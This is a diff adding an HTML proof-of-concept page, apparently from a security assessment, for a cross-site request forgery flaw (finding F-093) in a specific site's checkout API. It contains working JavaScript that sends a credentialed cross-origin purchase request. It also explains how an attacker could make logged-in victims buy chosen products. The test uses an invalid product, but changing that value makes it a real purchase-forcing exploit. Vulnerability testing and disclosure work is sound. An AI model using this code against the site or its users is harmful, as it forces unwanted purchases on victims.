@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>PoC: CSRF Checkout — alts.cool (F-093)</title>
+<style>
+  body { font-family: monospace; background: #0d1117; color: #c9d1d9;
+         max-width: 860px; margin: 40px auto; padding: 20px; }
+  h1 { color: #fb8f44; font-size: 1.2rem; }
+  .meta { background: #161b22; border: 1px solid #30363d; border-radius: 6px;
+          padding: 16px; margin: 16px 0; font-size: 0.85rem; line-height: 1.6; }
+  .meta strong { color: #f0f6fc; }
+  pre { background: #161b22; border: 1px solid #30363d; border-radius: 6px;
+        padding: 16px; overflow-x: auto; font-size: 0.82rem; line-height: 1.5; }
+  #result { background: #0d1a2e; border: 1px solid #58a6ff; border-radius: 6px;
+            padding: 14px; margin-top: 16px; white-space: pre-wrap; min-height: 60px; }
+  button { background: #fb8f44; color: #fff; border: none; padding: 10px 22px;
+           border-radius: 6px; cursor: pointer; font-size: 0.9rem; margin-top: 12px; }
+  .warn { color: #e3b341; font-size: 0.8rem; margin-top: 8px; }
+</style>
+</head>
+<body>
+<h1>⚠️ PoC: CSRF Checkout Trigger — alts.cool (F-093)</h1>
+<div class="meta">
+  <strong>Finding:</strong> F-093 · Severity: HIGH<br>
+  <strong>Target:</strong> POST https://alts.cool/api/payment/checkout<br>
+  <strong>Root cause:</strong> Checkout endpoint processes cross-origin JSON POST; returns HTTP 400
+  (validation error) rather than HTTP 401 (unauthorized) on unauthenticated cross-origin requests.<br>
+  <strong>Impact:</strong> An authenticated customer who visits a malicious page has their session
+  relayed to trigger a purchase. The attacker chooses the product and quantity. The victim pays.
+</div>
+
+<p>Click <strong>Run PoC</strong> to send a cross-origin checkout POST from this page.</p>
+<p class="warn">⚠ Using product_id="nonexistent" — server will process the request and return a validation error (NOT 401), proving no CSRF protection.</p>
+<button onclick="runPoc()">▶ Run PoC (safe — invalid product)</button>
+<div id="result">Waiting...</div>
+
+<h3 style="margin-top:24px;color:#8b949e;">Why status 400 ≠ safe</h3>
+<pre>Expected (secure): 401 Unauthorized — Auth check before processing
+Actual (confirmed): 400 Bad Request  — Processing attempted before auth check
+
+This means if the victim IS authenticated (has a valid session cookie),
+the CSRF will succeed and trigger a real purchase.</pre>
+
+<script>
+async function runPoc() {
+  document.getElementById("result").textContent = "Sending cross-origin checkout POST...";
+  try {
+    const start = performance.now();
+    const r = await fetch("https://alts.cool/api/payment/checkout", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({items:[{product_id:"blockaguard-poc-nonexistent",quantity:1}]}),
+      referrerPolicy: "no-referrer",
+      credentials: "include"
+    });
+    const elapsed = (performance.now() - start).toFixed(0);
+    const txt = await r.text();
+    document.getElementById("result").textContent =
+      "Status: " + r.status + " | Time: " + elapsed + "ms\n\n" +
+      "Response: " + txt.slice(0, 600) + "\n\n" +
+      (r.status === 401 ? "✅ 401 = Auth check FIRST — CSRF mitigated for unauthenticated users." :
+       r.status === 403 ? "✅ 403 = Request blocked — CSRF protection active." :
+       "⚠️ Status " + r.status + " — Request was PROCESSED (not auth-blocked).\n" +
+       "An authenticated victim would trigger a real purchase.");
+  } catch(e) {
+    document.getElementById("result").textContent = "Error: " + e.message;
+  }
+}
+</script>
+</body>
+</html>
